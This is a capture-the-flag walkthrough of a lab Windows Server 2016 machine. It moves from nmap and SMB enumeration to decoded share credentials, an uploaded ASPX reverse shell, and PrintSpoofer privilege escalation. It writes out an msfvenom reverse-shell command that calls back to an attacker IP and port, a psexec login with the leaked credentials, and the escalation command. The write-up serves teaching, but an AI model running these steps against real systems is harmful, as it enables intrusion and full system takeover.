Relevant

Target IP: 10.10.68.199

Challenge Description: The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test). The client has asked that you secure two flags (no location provided) as proof of exploitation: user.txt and root.txt.

Reconnaissance


Running an nmap scan against the target machine shows there are a few TCP ports open, as shown above. The target is running a Windows machine and it has a firewall deployed, so I used the -Pn -g flags to bypass this.


I performed an aggressive nmap scan against the open TCP ports and received the output above. It looks like there is a web application on port 80, SMB on ports 139 and 445, and RDP on 3389.


Using the command crackmapexec smb 10.10.68.199, I identified the target's OS and architecture: Windows Server 2016 x64; this information is useful. Is this machine vulnerable?


Using the --script=vuln from nmap, I obtained the information above. Apparently the target machine is vulnerable to ms17-010; therefore, EternalBlue exploit can be used. Before firing this exploit against the target machine, I wish to enumerate the different applications first.

Enumeration

Ports 139 and 445: SMB

Using the command smbclient -L 10.10.68.199, I enumerated to identify the different SMB shares. There is a SMB share called nt4wrksv, as shown in the picture above.


I connected to the nt4wrksv share and downloaded the file called passwords.txt on my machine. The content of this file is shown in the picture above. There are two base64 strings.


I decoded the two base64 strings and obtained the credentials above. Now I have two sets of credentials: Bill:Juw4nnaM4n420696969!$$$ and Bob:!P@$$W0rD!123.


I tired to use the two credentials against the RDP but I had no luck. However, only the Bob:!P@$$W0rD!123 is valid when I used the command impacket-psexec bob:'!P@$$W0rD!123'@10.10.68.199 against the target machine. In the result above, it states the user bob has write permissions. Maybe I can upload something even as the guest?


I connected to the share and uploaded a text file called test.txt. This was uploaded successfully. Running pwd also shows the 10.10.68.199\nt4wrksv. Can I access this share through a browser? I tried to access the uploaded test.txt, but I had no luck. I had to revert this machine, as my VPN was having issues. After reverting, the target machine has the IP of 10.10.70.238.

Port 80: HTTP

The webpage above is displayed for this application. The source-code of this page does not contain anything useful.


Now I have access to the uploaded file. After doing a full port scan, I notice there are more ports open. I browsed to http://10.10.70.238:49663/nt4wrksv/test.txt to access the file, as shown above. I can take advantage of this misconfiguration to upload a reverse shell.

Exploitation


Using the command msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=10.14.55.153 LPORT=8444 --format aspx -o shell.aspx, I generated a Windows x64 reverse shell payload. Then I uploaded this shell to the SMB share nt4wrksv.


I started a listener on port 8444 and browsed to http://10.10.70.238/nt4wrksv/shell.aspx to start the reverse shell. I caught this reverse shell on port 8444. Now I have a foothold on the target machine with the session as iis apppool\defaultapppool.

Privilege Escalation


Running the command whoami /priv shows the SeImpersonatePrivilege privilege is enabled.


I downloaded a copy of the PrintSpoofer.exe on my machine from here. Then I uploaded this to the target machine via the SMB share. I located the PrintSpoofer.exe file at C:\inetpub\wwwroot\nt4wrksv. Using the command PrintSpoofer.exe -i -c cmd, I executed the exploit to gain a nt authority\system shell as shown above. Now I have full access on the target machine.
